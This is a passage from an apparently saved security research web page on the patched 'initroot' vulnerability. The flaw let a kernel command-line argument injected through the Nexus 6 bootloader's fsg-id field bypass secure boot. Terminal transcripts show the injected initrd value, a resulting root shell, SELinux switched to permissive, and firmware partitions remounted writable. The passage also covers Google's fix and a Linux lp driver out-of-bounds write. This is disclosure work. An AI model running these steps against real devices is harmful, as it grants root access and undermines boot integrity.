</span><span class="gp">(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;</span><span class="w">
</span><span class="gp">(bootloader)   &lt;value&gt;</span><span class="w">
</span><span class="go">(bootloader)     a initrd=0x11000000,1518172
</span><span class="gp">(bootloader)   &lt;/value&gt;</span><span class="w">
</span><span class="gp">(bootloader)   &lt;description&gt;</span><span class="w">
</span><span class="go">(bootloader)     FSG IDs, see <a class="vglnk" href="http://goo.gl/gPmhU" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>gPmhU</span></a>
</span><span class="gp">(bootloader)   &lt;/description&gt;</span><span class="w">
</span><span class="gp">(bootloader) &lt;/UTAG&gt;</span><span class="w">
</span><span class="go">
OKAY [  0.016s]
finished. total time: 0.016s

</span><span class="gp">$</span><span class="w"> </span>fastboot flash aleph malicious.cpio.gz
<span class="go">[...]
target reported max download size of 536870912 bytes
sending 'aleph' (1482 KB)...
OKAY [  0.050s]
writing 'aleph'...
(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished. total time: 0.054s

</span><span class="gp">$</span><span class="w"> </span>fastboot <span class="k">continue</span>
<span class="go">[...]
resuming boot...
OKAY [  0.007s]
finished. total time: 0.007s

</span><span class="gp">$</span><span class="w"> </span>adb shell
<span class="gp">shamu:/ #</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
</span><span class="gp">shamu:/ #</span><span class="w"> </span>getenforce
<span class="go">Enforcing
</span><span class="gp">shamu:/ #</span><span class="w"> </span>setenforce permissive
<span class="gp">shamu:/ #</span><span class="w"> </span>getenforce
<span class="go">Permissive
</span><span class="gp">shamu:/ #</span><span class="w">
</span></code></pre></div></div>
<h2 id="beyond-initramfs-firmware-injection">Beyond initramfs: Firmware Injection</h2>
<p>Now that the we have full control over <code class="language-plaintext highlighter-rouge">rootfs</code>, we can also create a malicious <code class="language-plaintext highlighter-rouge">/vendor</code> folder, which normally contains firmware images of various SoCs available on the board:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shamu:/ #</span><span class="w"> </span><span class="nb">ls</span> /vendor/firmware
<span class="go">VRGain.bin  adsp.b03 adsp.b11                                 bcm20795_firmware.ncd   left.boost.music.eq           left.boost_n1b12.patch           right.boost.ringtone.eq        right.boost_ringtone_table.preset venus.mdt
a420_pfp.fw adsp.b04 adsp.b12                                 bcm4354A2.hcd           left.boost.ringtone.config    left.boost_n1c2.patch            right.boost.speaker            right.boost_voice_table.preset    widevine.b00
a420_pm4.fw adsp.b05 adsp.mdt                                 cy8c20247_24lkxi.hex    left.boost.ringtone.eq        left.boost_ringtone_table.preset right.boost.voice.config       venus.b00                         widevine.b01
acdb.mbn    adsp.b06 aonvr1.bin                               fw_bcmdhd.bin           left.boost.speaker            left.boost_voice_table.preset    right.boost.voice.eq           venus.b01                         widevine.b02
adsp.b00    adsp.b07 aonvr2.bin                               fw_bcmdhd_apsta.bin     left.boost.voice.config       right.boost.music.config         right.boost_music_table.preset venus.b02                         widevine.b03
adsp.b01    adsp.b08 atmel-a432-14061601-0102aa-shamu-p1.tdat keymaster               left.boost.voice.eq           right.boost.music.eq             right.boost_n1b12.patch        venus.b03                         widevine.mdt
adsp.b02    adsp.b10 atmel-a432-14103001-0103aa-shamu.tdat    left.boost.music.config left.boost_music_table.preset right.boost.ringtone.config      right.boost_n1c2.patch         venus.b04
</span></code></pre></div></div>
<p>Kernel drivers usually consume these images upon initialization, and update their SoC counterparts if needed. Hence, the attacker could flash unsigned firmware images. We haven’t checked if there are such, but from our experience with other devices, there are. As for signed ones, downgrade attacks might be possible as well. In addition, the modem firmware resides under <code class="language-plaintext highlighter-rouge">/firmware/image</code>, which we could also alter and theoretically conduct similar attacks (see below). Again, we haven’t verified what kind of integrity checking exists nor if it is vulnerable to downgrade attack, leaving it aside for future research.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">shamu:</span><span class="o">/</span> <span class="err">#</span> <span class="n">umount</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="n">firmware</span>
<span class="n">shamu</span><span class="o">:/</span> <span class="err">#</span> <span class="n">mount</span>  <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">block</span><span class="o">/</span><span class="n">mmcblk0p1</span> <span class="o">/</span><span class="n">firmware</span> <span class="o">-</span><span class="n">o</span> <span class="n">rw</span>
<span class="n">shamu</span><span class="o">:/</span> <span class="err">#</span> <span class="n">ls</span> <span class="o">/</span><span class="n">firmware</span><span class="o">/</span><span class="n">image</span>
<span class="n">acdb</span><span class="p">.</span><span class="n">mbn</span>         <span class="n">bdwlan20</span><span class="p">.</span><span class="n">bin</span> <span class="n">cmnlib</span><span class="p">.</span><span class="n">b03</span>       <span class="n">efs1</span><span class="p">.</span><span class="n">bin</span>    <span class="n">isdbtmm</span><span class="p">.</span><span class="n">b01</span> <span class="n">mba_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">playready</span><span class="p">.</span><span class="n">b00</span> <span class="n">playready</span><span class="p">.</span><span class="n">mdt</span> <span class="n">prov</span><span class="p">.</span><span class="n">b03</span>            <span class="n">qwlan11</span><span class="p">.</span><span class="n">bin</span>     <span class="n">sampleapp</span><span class="p">.</span><span class="n">b00</span> <span class="n">sampleapp</span><span class="p">.</span><span class="n">mdt</span>    <span class="n">securemm</span><span class="p">.</span><span class="n">b01</span> <span class="n">tqs</span><span class="p">.</span><span class="n">b00</span> <span class="n">tqs</span><span class="p">.</span><span class="n">mdt</span>        <span class="n">utf20</span><span class="p">.</span><span class="n">bin</span>
<span class="n">apps_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">cmnlib</span><span class="p">.</span><span class="n">b00</span>   <span class="n">cmnlib</span><span class="p">.</span><span class="n">mdt</span>       <span class="n">efs2</span><span class="p">.</span><span class="n">bin</span>    <span class="n">isdbtmm</span><span class="p">.</span><span class="n">b02</span> <span class="n">mba_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">playready</span><span class="p">.</span><span class="n">b01</span> <span class="n">prov</span><span class="p">.</span><span class="n">b00</span>      <span class="n">prov</span><span class="p">.</span><span class="n">mdt</span>            <span class="n">qwlan20</span><span class="p">.</span><span class="n">bin</span>     <span class="n">sampleapp</span><span class="p">.</span><span class="n">b01</span> <span class="n">sbl1_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">securemm</span><span class="p">.</span><span class="n">b02</span> <span class="n">tqs</span><span class="p">.</span><span class="n">b01</span> <span class="n">tz_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span>
<span class="n">apps_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">cmnlib</span><span class="p">.</span><span class="n">b01</span>   <span class="n">dsp2_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">efs3</span><span class="p">.</span><span class="n">bin</span>    <span class="n">isdbtmm</span><span class="p">.</span><span class="n">b03</span> <span class="n">otp11</span><span class="p">.</span><span class="n">bin</span>       <span class="n">playready</span><span class="p">.</span><span class="n">b02</span> <span class="n">prov</span><span class="p">.</span><span class="n">b01</span>      <span class="n">qdsp6sw_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">rpm_9225</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">sampleapp</span><span class="p">.</span><span class="n">b02</span> <span class="n">sbl1_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">securemm</span><span class="p">.</span><span class="n">b03</span> <span class="n">tqs</span><span class="p">.</span><span class="n">b02</span> <span class="n">tz_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span>
<span class="n">bdwlan11</span><span class="p">.</span><span class="n">bin</span>     <span class="n">cmnlib</span><span class="p">.</span><span class="n">b02</span>   <span class="n">dsp2_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">isdbtmm</span><span class="p">.</span><span class="n">b00</span> <span class="n">isdbtmm</span><span class="p">.</span><span class="n">mdt</span> <span class="n">otp20</span><span class="p">.</span><span class="n">bin</span>       <span class="n">playready</span><span class="p">.</span><span class="n">b03</span> <span class="n">prov</span><span class="p">.</span><span class="n">b02</span>      <span class="n">qdsp6sw_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">rpm_9625</span><span class="p">.</span><span class="n">mbn</span><span class="p">.</span><span class="n">gz</span> <span class="n">sampleapp</span><span class="p">.</span><span class="n">b03</span> <span class="n">securemm</span><span class="p">.</span><span class="n">b00</span>     <span class="n">securemm</span><span class="p">.</span><span class="n">mdt</span> <span class="n">tqs</span><span class="p">.</span><span class="n">b03</span> <span class="n">utf11</span><span class="p">.</span><span class="n">bin</span>
<span class="n">shamu</span><span class="o">:/</span> <span class="err">#</span> <span class="n">echo</span> <span class="n">foo</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">firmware</span><span class="o">/</span><span class="n">image</span><span class="o">/</span><span class="n">foo</span>
<span class="n">shamu</span><span class="o">:/</span> <span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">firmware</span><span class="o">/</span><span class="n">image</span><span class="o">/</span><span class="n">foo</span>
<span class="n">foo</span>
</code></pre></div></div>
<h2 id="googles-patch">Google’s Patch</h2>
<p>Google’s patch for this vulnerability is available in the <a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/[May%202017%20Android%20Security%20Bulletin](https://source.android.com/security/bulletin/2017-05-01#eop-in-motorola-bootloader)">May 2017 Bulletin</a>. Bootloader version <code class="language-plaintext highlighter-rouge">moto-apq8084-72.03</code> available in build <code class="language-plaintext highlighter-rouge">N6F27C</code> now sanitizes the <code class="language-plaintext highlighter-rouge">fsg-id</code>, <code class="language-plaintext highlighter-rouge">carrier</code> and <code class="language-plaintext highlighter-rouge">console</code> config arguments:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ fastboot oem config fsg-id "foo foo=1"
[...]
$ fastboot oem config carrier "bar bar=1"
[...]
$ fastboot oem config carrier "baz baz=1"
[...]
$ fastboot oem config
[android@aosp:/aosp/source/android-7.1.1_r40]$ fastboot oem config
[...]
(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"carrier"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)     bar
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Carrier IDs, see <a class="vglnk" href="http://goo.gl/lojLh3" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>lojLh3</span></a>
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"console"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)     baz
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Config kernel console log
(bootloader)       enable|true     - enable with default settings
(bootloader)       disable|false   - disable
(bootloader)       <span class="nt">&lt;config</span> <span class="err">string</span><span class="nt">&gt;</span> - enable with customized settings
(bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"fsg-id"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)     foo
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     FSG IDs, see <a class="vglnk" href="http://goo.gl/gPmhU" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>gPmhU</span></a>
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>]
</code></pre></div></div>
<h2 id="anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363">Anecdote: A Linux Kernel Out-of-Bounds Write (CVE-2017-1000363)</h2>
<p>During the work on this research, we also uncovered an ancient (since 2.2.0!) Out-of-Bounds write in the Linux Kernel <span class="cve-moderate" title="Linux lp.c Out-of-Bounds Write via Kernel Command-line"><a href="https://alephsecurity.com/vulns/aleph-2017023">CVE-2017-1000363</a></span>. The bug is in the <code class="language-plaintext highlighter-rouge">lp</code> driver (so <code class="language-plaintext highlighter-rouge">CONFIG_PRINTER=y</code> is required), and is triggered when many <code class="language-plaintext highlighter-rouge">lp=none</code> arguments are appended to the Kernel Command Line:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="n">parport_nr</span><span class="p">[</span><span class="n">LP_NO</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">[</span><span class="mi">0</span> <span class="p">...</span> <span class="n">LP_NO</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">LP_PARPORT_UNSPEC</span> <span class="p">};</span>
<span class="p">[...]</span>
<span class="cp">#ifndef MODULE
</span><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">lp_setup</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">static</span> <span class="kt">int</span> <span class="n">parport_ptr</span><span class="p">;</span>
<span class="p">[...]</span>
	<span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s">"none"</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">parport_nr</span><span class="p">[</span><span class="n">parport_ptr</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">LP_PARPORT_NONE</span><span class="p">;</span>
	<span class="p">}</span> 
<span class="p">[...]</span>
<span class="err">}</span>
<span class="cp">#endif
</span><span class="p">[...]</span>
<span class="n">__setup</span><span class="p">(</span><span class="s">"lp="</span><span class="p">,</span> <span class="n">lp_setup</span><span class="p">);</span>
</code></pre></div></div>
<p>A <a href="https://github.com/torvalds/linux/commit/3e21f4af170bebf47c187c1ff8bf155583c9f3b1">patch</a> has been committed to the mainline kernel.</p>
</div>
</div>
<br>
<div id="disqus_thread"><iframe id="dsq-app8186" name="dsq-app8186" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 1247px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
<script>
/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/

var disqus_config = function () {
this.page.url = 'https://alephsecurity.com/2017/05/23/nexus6-initroot/';  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = '/2017/05/23/nexus6-initroot'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};

(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = '//alephsecurity.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<script id="dsq-count-scr" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/count.js.下載" async=""></script>
</div>
</div>


<iframe style="display: none;" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/saved_resource(1).html"></iframe></body></html>